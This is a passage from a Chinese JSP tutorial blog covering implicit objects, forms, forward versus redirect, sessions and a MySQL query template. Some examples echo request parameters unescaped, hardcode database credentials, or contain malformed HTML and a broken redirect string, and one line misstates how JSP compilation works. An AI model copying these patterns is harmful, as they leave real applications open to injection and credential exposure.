Web服务器将响应传递给用户的浏览器，浏览器解析HTML和动态内容，并将其显示在用户的屏幕上。</li></ol><p>需要注意的是，一旦JSP文件被编译成Servlet并生成响应，JSP本身在整个过程中不再直接参与。每次请求JSP页面时，Servlet引擎都会重新处理该JSP，以确保动态内容生成和个性化的效果。</p><p>通过这种方式，JSP允许开发人员在HTML中嵌入Java代码，实现更加灵活和动态的Web应用程序。同时，与Java Servlet结合，JSP可以更高效地生成动态内容并响应客户端请求。</p><h2 id="JSP基础代码"><a href="#JSP基础代码" class="headerlink" title="JSP基础代码"></a>JSP基础代码</h2><p>当你开始学习JSP时，以下是一些基础代码示例，帮助你理解JSP的工作原理和语法。我们将从简单的JSP页面开始，逐步介绍如何嵌入Java代码和显示动态内容。</p><p><strong>1. 创建基本的JSP页面：</strong></p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!-- index.jsp --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My First JSP Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, World!&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>解释：</p><ul><li>这是一个简单的HTML页面，其中包含一个h1标签显示”Hello, World!”。</li><li>保存该文件为index.jsp，并将其放置在Web应用程序的合适位置，例如在WebContent目录下。</li></ul><p><strong>2. 在JSP中嵌入Java代码：</strong></p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!-- greet.jsp --&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Greeting Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;% </span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">"John"</span>; <span class="comment">// Java代码段，定义一个名为name的字符串变量</span></span><br><span class="line">        out.println(<span class="string">"Hello, "</span> + name); <span class="comment">// Java代码段，输出动态内容</span></span><br><span class="line">    %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>解释：</p><ul><li><code>&lt;%@ page %&gt;</code>指令用于定义页面的属性和配置信息。在这里，我们指定使用Java语言，并且输出的字符编码为UTF-8。</li><li>在<code>&lt;body&gt;</code>标签中，我们使用<code>&lt;% %&gt;</code>标签将Java代码嵌入到JSP页面中。</li><li>在这个例子中，我们定义了一个名为<code>name</code>的字符串变量，并使用<code>out.println()</code>函数输出”Hello, John”。这样，我们在浏览器中访问该页面时，将看到”Hello, John”被显示出来。</li></ul><p><strong>3. 使用JSP隐式对象：</strong></p><p>JSP提供了一组隐式对象，您无需声明即可在JSP页面中直接使用。以下是一些常用的隐式对象：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!-- implicit_objects.jsp --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Implicit Objects&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;User Information&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Username: &lt;%= request.getParameter(<span class="string">"username"</span>) %&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;IP Address: &lt;%= request.getRemoteAddr() %&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Session ID: &lt;%= session.getId() %&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>解释：</p><ul><li><code>request</code>：代表客户端的请求，可以用于获取请求参数等信息。</li><li><code>session</code>：代表用户的会话，可以用于跟踪用户状态和共享数据。</li></ul><p>注意：在实际开发中，为了更好地分离逻辑和视图，应该尽量避免在JSP中嵌入过多的Java代码。应该将业务逻辑封装在JavaBean、Servlet或其他后端组件中，并在JSP中调用这些组件，以提高代码的可维护性和复用性。</p><p>这些基础的JSP代码示例应该能帮助您开始学习JSP，并逐渐了解如何在JSP中嵌入Java代码和生成动态内容。继续学习JSP和相关的Web开发技术，您将能够构建更复杂和功能丰富的Web应用程序。</p><h2 id="JSP关于out-print报红解决办法"><a href="#JSP关于out-print报红解决办法" class="headerlink" title="JSP关于out.print报红解决办法"></a>JSP关于out.print报红解决办法</h2><p>虽然可以正常使用，但是却有报红，这是因为lib包和Tomcat的lib没有正确被识别导致的，需要手动识别添加</p><p>首先在WEB-INF里建立lib包然后导入在Tomcat-lib里的jaspic-api and servlet-api 导入后在文件-项目结构-模块-你的项目-依赖-Tomcat（没有就点击加号添加）</p><p>最后重启项目</p><h2 id="JSP实例演示1"><a href="#JSP实例演示1" class="headerlink" title="JSP实例演示1"></a>JSP实例演示1</h2><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Date"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.text.SimpleDateFormat"</span> %&gt;&lt;%-- Created by IntelliJ IDEA. --%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  web项目启动成功</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">"yyyy-MM-dd"</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> simpleDateFormat.format(date);</span><br><span class="line">    out.print(format);</span><br><span class="line">    String[] fruits = {<span class="string">"Apple"</span>, <span class="string">"Banana"</span>, <span class="string">"Orange"</span>, <span class="string">"Grapes"</span>, <span class="string">"Mango"</span>};</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;%=format%&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><h1 id="4-JSP核心内置对象"><a href="#4-JSP核心内置对象" class="headerlink" title="4.JSP核心内置对象"></a>4.JSP核心内置对象</h1><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><ol><li><strong>request</strong>：代表客户端的请求。它可以用来获取客户端发送的数据，比如表单数据、URL 参数等。</li><li><strong>response</strong>：代表服务器的响应。你可以使用它来发送数据回客户端，比如生成 HTML 内容。</li><li><strong>out</strong>：这个对象用于输出内容到客户端。你可以使用它将文本、HTML、XML 等内容发送给浏览器。</li><li><strong>session</strong>：用于在不同请求之间保存用户的会话数据。可以用来存储用户登录信息、购物车内容等。</li><li><strong>application</strong>：代表整个 web 应用程序的上下文。可以在不同的页面之间共享数据。</li><li><strong>pageContext</strong>：代表 JSP 页面的上下文信息。可以用来获取其他内置对象。</li><li><strong>config</strong>：包含 JSP 页面的配置信息，比如初始化参数。</li><li><strong>page</strong>：指向当前的 JSP 页面本身，可以用来调用自身的方法。</li><li><strong>exception</strong>：在发生异常时，包含了异常对象的信息。</li></ol><p>你可以根据需要，使用这些内置对象来处理不同的任务和数据。记得根据每个内置对象的特点和用途做出相应的笔记。如果需要更详细的信息，可以查阅 JSP 官方文档或其他相关资料。</p><h2 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h2><ol><li><strong>request</strong>：假设你有一个简单的登录表单，用户通过输入用户名和密码提交登录请求。在 JSP 页面中，你可以使用 <code>request.getParameter("username")</code> 和 <code>request.getParameter("password")</code> 来获取用户输入的用户名和密码。</li><li><strong>response</strong>：如果你想向客户端发送一个简单的 “Hello World” 消息，可以使用 <code>response.getWriter().println("Hello World");</code> 将该消息输出到客户端。</li><li><strong>out</strong>：你可以使用 <code>out.println("这是输出到浏览器的内容");</code> 将指定的文本内容输出到客户端的浏览器。</li><li><strong>session</strong>：假设用户登录后，你想在不同页面之间保持用户的登录状态。你可以使用 <code>session.setAttribute("username", "user123");</code> 将用户的用户名存储在会话中，在其他页面中通过 <code>session.getAttribute("username");</code> 获取该值。</li><li><strong>application</strong>：如果你想在整个 web 应用程序中共享某个值，比如一个全局配置，你可以使用 <code>application.setAttribute("key", value);</code> 存储数据，并在其他页面中通过 <code>application.getAttribute("key");</code> 获取该值。</li><li><strong>pageContext</strong>：在 JSP 页面中，你可以使用 <code>pageContext.getRequest()</code> 获取请求对象，或者使用 <code>pageContext.getServletContext()</code> 获取 servlet 上下文对象。</li><li><strong>config</strong>：如果在 <code>web.xml</code> 配置文件中设置了一个初始化参数，你可以在 JSP 页面中使用 <code>config.getInitParameter("paramName");</code> 获取该参数的值。</li><li><strong>page</strong>：你可以在 JSP 页面中使用 <code>&lt;% pageContext.forward("otherPage.jsp"); %&gt;</code> 来调用 <code>otherPage.jsp</code> 页面的内容。</li><li><strong>exception</strong>：在 JSP 页面中，如果发生异常，你可以使用 <code>exception.printStackTrace();</code> 输出异常堆栈信息。</li></ol><h2 id="from表格提交与接收"><a href="#from表格提交与接收" class="headerlink" title="from表格提交与接收"></a>from表格提交与接收</h2><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%-- Created by IntelliJ IDEA. --%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;from表单提交&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;form method=<span class="string">"post"</span> action=<span class="string">"indexController.jsp"</span>&gt;</span><br><span class="line">    &lt;in&gt;</span><br><span class="line">      商品评价</span><br><span class="line">      &lt;input type=<span class="string">"radio"</span> value=<span class="string">"五星"</span> name=<span class="string">"level"</span>&gt;五星</span><br><span class="line">      &lt;input type=<span class="string">"radio"</span> value=<span class="string">"四星"</span> name=<span class="string">"level"</span>&gt;四星</span><br><span class="line">      &lt;input type=<span class="string">"radio"</span> value=<span class="string">"三星"</span> name=<span class="string">"level"</span> checked&gt;三星</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      &lt;textarea name=<span class="string">"info"</span> rows=<span class="string">"4"</span> cols=<span class="string">"12"</span>&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      配送评价</span><br><span class="line">      &lt;input type=<span class="string">"checkbox"</span> value=<span class="string">"配送快"</span> name=<span class="string">"send"</span>&gt;配送快&lt;/input&gt;</span><br><span class="line">      &lt;input type=<span class="string">"checkbox"</span> value=<span class="string">"配送快"</span> name=<span class="string">"send"</span>&gt;配送好&lt;/input&gt;</span><br><span class="line">      &lt;input type=<span class="string">"checkbox"</span> value=<span class="string">"配送快"</span> name=<span class="string">"send"</span>&gt;服务态度好&lt;/input&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=<span class="string">"submit"</span>&gt; &lt;input type=<span class="string">"reset"</span>&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Administrator</span><br><span class="line">  Date: <span class="number">2023</span>/<span class="number">8</span>/<span class="number">7</span></span><br><span class="line">  Time: <span class="number">14</span>:<span class="number">47</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;接受from&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//设置乱码</span></span><br><span class="line">    request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">level</span> <span class="operator">=</span> request.getParameter(<span class="string">"level"</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> request.getParameter(<span class="string">"info"</span>);</span><br><span class="line">    out.print(level);</span><br><span class="line">    out.print(info);</span><br><span class="line">    String[] sends = request.getParameterValues(<span class="string">"send"</span>);</span><br><span class="line">    <span class="keyword">for</span> (String send:sends){</span><br><span class="line">        out.print(send);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="转发和重定向的区别"><a href="#转发和重定向的区别" class="headerlink" title="转发和重定向的区别"></a>转发和重定向的区别</h2><p>重定向（Redirect）和转发（Forward）是在 web 应用程序中用于页面跳转的两种不同技术，它们有以下区别：</p><p><strong>1. 目标地址不同：</strong></p><ul><li>重定向：将请求发送到一个完全不同的 URL 地址。客户端会发起新的请求，并且浏览器地址栏会显示新的 URL。</li><li>转发：将请求转发给同一 web 服务器上的另一个资源（如 JSP、Servlet）。客户端不知道发生了转发，URL 地址保持不变。</li></ul><p><strong>2. 流程：</strong></p><ul><li>重定向：是两次请求-响应过程。首先，客户端发送一个请求给服务器，服务器返回一个响应来重定向到另一个 URL，客户端再次发送请求到该新的 URL。</li><li>转发：是一次请求-响应过程。客户端发送请求给服务器，服务器直接将请求转发给另一个资源进行处理，然后返回响应给客户端。</li></ul><p><strong>3. 数据传递：</strong></p><ul><li>重定向：不同请求之间的数据传递需要使用 URL 参数、Cookie 或者会话（Session）。</li><li>转发：可以在服务器端通过请求对象传递数据给目标资源，使用 <code>request.setAttribute()</code>，目标资源可以通过请求对象获取数据。</li></ul><p><strong>4. 地址栏变化：</strong></p><ul><li>重定向：会导致浏览器地址栏显示新的 URL，因为发生了新的请求和响应。</li><li>转发：浏览器地址栏 URL 不会改变，因为是在服务器端内部处理的转发。</li></ul><p><strong>5. 应用场景：</strong></p><ul><li>重定向：适合用于不同 web 应用程序之间的跳转，或者在处理 POST 请求后防止表单重复提交。</li><li>转发：适合用于在同一 web 应用程序内部的页面跳转和共享数据。</li></ul><p>在选择重定向或转发时，需要考虑这两者之间的差异以及适用的具体情况。重定向更适合用于不同资源或应用程序之间的跳转，而转发更适合用于在同一应用程序内部进行页面跳转和数据传递。</p><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;% request.getRequestDispatcher(<span class="string">"home.jsp"</span>).forward(request,response); %&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;% response.sendRedirect(<span class="string">"home.jsp"</span>); %&gt;</span><br></pre></td></tr></tbody></table></figure><p>在这种情况如何传参把特定参数给跳转的页</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;% response.sendRedirect(<span class="string">"home.jsp"</span> + username); %&gt;</span><br></pre></td></tr></tbody></table></figure><h1 id="5-session对象"><a href="#5-session对象" class="headerlink" title="5.session对象"></a>5.session对象</h1><h2 id="Session-对象"><a href="#Session-对象" class="headerlink" title="Session 对象"></a>Session 对象</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>session</code>对象是在 web 应用程序中用于在不同请求之间存储和共享用户数据的一种机制。每个用户的 <code>session</code> 对象在用户访问 web 应用程序时都会被创建，它可以在用户的整个会话期间保存数据，直到用户关闭浏览器或会话超时。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><code>session</code> 对象是基于用户的，每个用户都会有自己的 <code>session</code>。</li><li>通过 <code>session</code> 对象，可以在不同的页面和请求之间共享数据，无需每次都通过 URL 参数或表单字段传递数据。</li></ul><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol><li><strong>创建 <code>session</code> 对象</strong>： 在 JSP 页面或 Servlet 中，可以通过 <code>request.getSession()</code> 方法获取当前用户的 <code>session</code> 对象。如果 <code>session</code> 对象不存在，则会创建一个新的 <code>session</code>。</li><li><strong>存储数据</strong>： 使用 <code>session.setAttribute("key", value)</code> 方法可以将数据存储在 <code>session</code> 对象中。<code>key</code> 是用来标识数据的名称，<code>value</code> 是实际的数据。</li><li><strong>获取数据</strong>： 通过 <code>session.getAttribute("key")</code> 方法可以获取之前存储在 <code>session</code> 中的数据。</li><li><strong>删除数据</strong>： 可以使用 <code>session.removeAttribute("key")</code> 方法从 <code>session</code> 对象中删除指定的数据。</li><li>**销毁 <code>session</code>**： 通常，<code>session</code> 会在用户关闭浏览器后自动销毁，或者根据配置的超时时间进行销毁。也可以使用 <code>session.invalidate()</code> 方法手动销毁当前用户的 <code>session</code>。</li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设你正在开发一个在线购物网站：</p><ol><li>用户登录后，可以将用户的用户名存储在 <code>session</code> 对象中，以便在其他页面显示欢迎信息。</li><li>用户在浏览商品时，将选中的商品信息存储在 <code>session</code> 对象中的购物车中，以便用户在不同页面之间保持购物车内容。</li><li>用户结账时，从 <code>session</code> 对象中获取购物车中的商品信息，进行订单处理。</li></ol><p>通过使用 <code>session</code> 对象，你可以在用户的整个会话期间持久化保存用户的状态和数据，实现更好的用户体验。</p><p>记得根据需要，将上述内容调整为你的笔记规范，帮助你更好地理解和记忆 <code>session</code> 对象的用法。</p><h2 id="session-常用方法介绍与举例"><a href="#session-常用方法介绍与举例" class="headerlink" title="session 常用方法介绍与举例"></a><code>session</code> 常用方法介绍与举例</h2><h4 id="1-setAttribute-String-name-Object-value"><a href="#1-setAttribute-String-name-Object-value" class="headerlink" title="1. setAttribute(String name, Object value)"></a>1. <code>setAttribute(String name, Object value)</code></h4><ul><li>作用：将数据存储在 <code>session</code> 对象中。</li><li>参数：<ul><li><code>name</code>：用于标识数据的名称。</li><li><code>value</code>：实际的数据。</li></ul></li></ul><p><strong>示例</strong>：在登录成功后，将用户的用户名存储在 <code>session</code> 中。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">"user123"</span>;</span><br><span class="line">session.setAttribute(<span class="string">"username"</span>, username);</span><br></pre></td></tr></tbody></table></figure><h4 id="2-getAttribute-String-name"><a href="#2-getAttribute-String-name" class="headerlink" title="2. getAttribute(String name)"></a>2. <code>getAttribute(String name)</code></h4><ul><li>作用：从 <code>session</code> 对象中获取之前存储的数据。</li><li>参数：<code>name</code>：要获取的数据的名称。</li></ul><p><strong>示例</strong>：在其他页面中获取之前存储的用户名。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">storedUsername</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">"username"</span>);</span><br></pre></td></tr></tbody></table></figure><h4 id="3-removeAttribute-String-name"><a href="#3-removeAttribute-String-name" class="headerlink" title="3. removeAttribute(String name)"></a>3. <code>removeAttribute(String name)</code></h4><ul><li>作用：从 <code>session</code> 对象中删除指定名称的数据。</li><li>参数：<code>name</code>：要删除的数据的名称。</li></ul><p><strong>示例</strong>：在用户退出登录时，清除存储的用户名。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">session.removeAttribute(<span class="string">"username"</span>);</span><br></pre></td></tr></tbody></table></figure><h4 id="4-invalidate"><a href="#4-invalidate" class="headerlink" title="4. invalidate()"></a>4. <code>invalidate()</code></h4><ul><li>作用：手动销毁当前用户的 <code>session</code> 对象，清除其中的所有数据。</li></ul><p><strong>示例</strong>：用户注销或会话过期时，调用该方法销毁 <code>session</code>。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">session.invalidate();</span><br></pre></td></tr></tbody></table></figure><h4 id="5-getId"><a href="#5-getId" class="headerlink" title="5. getId()"></a>5. <code>getId()</code></h4><ul><li>作用：获取当前 <code>session</code> 的唯一标识符。</li></ul><p><strong>示例</strong>：用于记录日志或跟踪用户会话。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sessionID</span> <span class="operator">=</span> session.getId();</span><br></pre></td></tr></tbody></table></figure><h4 id="6-getCreationTime"><a href="#6-getCreationTime" class="headerlink" title="6. getCreationTime()"></a>6. <code>getCreationTime()</code></h4><ul><li>作用：获取 <code>session</code> 对象创建的时间。</li></ul><p><strong>示例</strong>：用于跟踪会话的开始时间。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">creationTime</span> <span class="operator">=</span> session.getCreationTime();</span><br></pre></td></tr></tbody></table></figure><h4 id="7-getLastAccessedTime"><a href="#7-getLastAccessedTime" class="headerlink" title="7. getLastAccessedTime()"></a>7. <code>getLastAccessedTime()</code></h4><ul><li>作用：获取用户上次访问 <code>session</code> 对象的时间。</li></ul><p><strong>示例</strong>：用于判断用户是否活跃。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">lastAccessedTime</span> <span class="operator">=</span> session.getLastAccessedTime();</span><br></pre></td></tr></tbody></table></figure><p>通过上述常用方法，你可以在 <code>session</code> 对象中存储、获取、删除数据，管理用户会话，以及追踪用户活动。这些方法能够帮助你更好地利用 <code>session</code> 来维护用户状态和数据。</p><h2 id="JSP连接数据库模板"><a href="#JSP连接数据库模板" class="headerlink" title="JSP连接数据库模板"></a>JSP连接数据库模板</h2><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Administrator</span><br><span class="line">  Date: <span class="number">2023</span>/<span class="number">8</span>/<span class="number">7</span></span><br><span class="line">  Time: <span class="number">17</span>:<span class="number">01</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;数据库读取输出&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.sql.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">// 声明数据库连接信息</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">"jdbc:mysql://localhost:3306/zhuanzhuandb?serverTimezone=GMT-8"</span>; <span class="comment">// 数据库的连接 URL</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">"root"</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">"123"</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line"><span class="comment">// 加载MySQL驱动程序</span></span><br><span class="line">Class.forName(<span class="string">"com.mysql.cj.jdbc.Driver"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立数据库连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl, username, password);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建并执行查询</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">"SELECT ROW_NUMBER() OVER (ORDER BY addTime) AS row_num, id, name, price, addTime FROM goods WHERE isOnSell = 1 LIMIT 1 , 5"</span>;</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">    out.println(<span class="string">"_______________________________________________________________________________"</span> + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    out.println( <span class="string">"序号"</span> + <span class="string">"\t"</span> + <span class="string">"好物编号"</span> + <span class="string">"\t"</span> + <span class="string">"姓名"</span> + <span class="string">"\t"</span> + <span class="string">"价格"</span> + <span class="string">"\t"</span> + <span class="string">"上架时间"</span>+ <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    out.println(<span class="string">"_______________________________________________________________________________"</span>+ <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">while</span> (resultSet.next()){</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> resultSet.getInt(<span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="number">2</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> resultSet.getString(<span class="number">3</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">price</span> <span class="operator">=</span> resultSet.getInt(<span class="number">4</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">Date</span> <span class="operator">=</span> resultSet.getString(<span class="number">5</span>);</span><br><span class="line">            out.println(x + <span class="string">"\t"</span> + <span class="string">"\t"</span> + id + <span class="string">"\t"</span> + name + <span class="string">"\t"</span> + price + <span class="string">"\t"</span> + Date+ <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        }</span><br><span class="line">        System.out.println(<span class="string">"_______________________________________________________________________________"</span>+ <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">resultSet.close();</span><br><span class="line">statement.close();</span><br><span class="line">connection.close();</span><br><span class="line"></span><br><span class="line">} <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">out.println(<span class="string">"MySQL驱动程序未找到： "</span> + e.getMessage());</span><br><span class="line">} <span class="keyword">catch</span> (SQLException e) {</span><br><span class="line">out.println(<span class="string">"数据库连接错误： "</span> + e.getMessage());</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><h1 id="6-Cookie"><a href="#6-Cookie" class="headerlink" title="6.Cookie"></a>6.Cookie</h1><h1 id="7-JSP数据访问"><a href="#7-JSP数据访问" class="headerlink" title="7.JSP数据访问"></a>7.JSP数据访问</h1><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>在JSP中，<code>&lt;%@ include %&gt;</code> 指令用于将一个文件的内容嵌入到另一个文件中，从而在页面上进行代码重用。这种技术被称为”包含”（include），它可以在编译时或运行时将指定的文件内容合并到当前的JSP页面中。</p><p>包含可以帮助减少代码的冗余，提高代码的可维护性，并允许在多个页面中共享相同的代码片段。有两种主要的包含方式：</p><ol><li><p><strong>静态包含（Static Include）</strong>：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">"header.jsp"</span> %&gt;</span><br><span class="line">&lt;!-- Other content --&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">"footer.jsp"</span> %&gt;</span><br></pre></td></tr></tbody></table></figure><p>静态包含在JSP页面的编译阶段将被合并到当前页面，作为页面的一部分。在生成的servlet代码中，被包含的内容就像直接写在包含指令的位置一样。</p></li><li><p><strong>动态包含（Dynamic Include）</strong>：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">"header.jsp"</span> /&gt;</span><br><span class="line">&lt;!-- Other content --&gt;</span><br><span class="line">&lt;jsp:include page=<span class="string">"footer.jsp"</span> 